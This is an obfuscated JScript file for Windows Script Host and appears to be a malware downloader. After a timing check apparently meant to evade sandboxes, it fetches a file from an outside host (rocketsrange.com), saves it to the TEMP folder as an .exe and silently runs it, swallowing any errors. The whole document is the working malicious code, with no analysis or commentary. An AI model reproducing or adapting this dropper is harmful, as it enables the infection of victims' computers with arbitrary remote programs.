var _D = false;
var _K1 = "CreateObject";
var _M = function _H() {return WScript[_K1]("WScript"+".Shell");}(), _KG = 11;
var _OA = "MSXML2.XMLHTTP";
var _U0 = 2123213;
var _L = 0;
function _E0(_F){_M["Run"](_F, _L, _L);};
function _EO(){return _OA + "";};
function _T(_JE, _PY){_L = _L * 1; return _JE - _PY;};
function _RE(){return _K1;};
/*@cc_on
  @if (@_win32 || @_win64)
    _D = true;
  @end
@*/
if (_D)
{
var _HC = "";
function _K0(){return 22;};
var _QZ = 0; var _MT = 0;
function _QN()
{
var _WA = new this["Date"]();
var _DS = _WA["getUTCMilliseconds"]();
WScript["Sleep"](_K0());
var _WA = new this["Date"]();
var _VM = _WA["getUTCMilliseconds"]();
WScript["Sleep"](_K0());
var _WA = new this["Date"]();
var _U = _WA["getUTCMilliseconds"]();
var _QZ = "_TK";
_QZ = _T(_VM, _DS);
var _MT = "_B";
_MT = _T(_U, _VM);
_HC = "open";
return _T(_QZ, _MT);
}
var _G = false;
var _NY = false;
for (var _PP = _L; _PP < _K0() * 1; _PP++){if (_QN() != _L){
_G = true; 
_MT = "31" + 11 * _QZ + _MT; 
_NY = true; 
break;
}}
function _E() {return ((_G == true) && (_G == _NY)) ? 1 : _L;};
if (_G && _E() && _NY){
function _K() {return _M["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "LBZz2v2R9fG.ex" + "e";};
 _SS = _EO();
 _F0 = WScript[_K1](_SS);
 var _E1 = 1;
 while (_E1){
try {
	if (_E1 == 1)
	{
		_F0[_HC]("GET", "http://rocketsrange.com/b5ksa", false);
		_F0["send"]();
		_ZR = "Sleep";
	}
	WScript[_ZR](_K0() + 120); 
	if (_F0["readystate"] < 2 * 2) continue;
	_E1 = _L;
	function _YA(_XO) {var _KV = (1, 2, 3, 4, 5, _XO); return _KV;};
	_PX = WScript[_RE()]("ADODB.Stream");
	_SS = _PX;
	_SS[_HC]();
	_SS["type"] = _YA(1);
	_SS["write"](_F0["ResponseBody"]);
	_PX["position"] = _YA(_L);
	_SS["Save" + "ToFile"](_K(), 2);
	_PX["cl"+"ose"]();
	_H0 = _K();
	_E0(_H0);
} catch(_T0){};
}
}
}

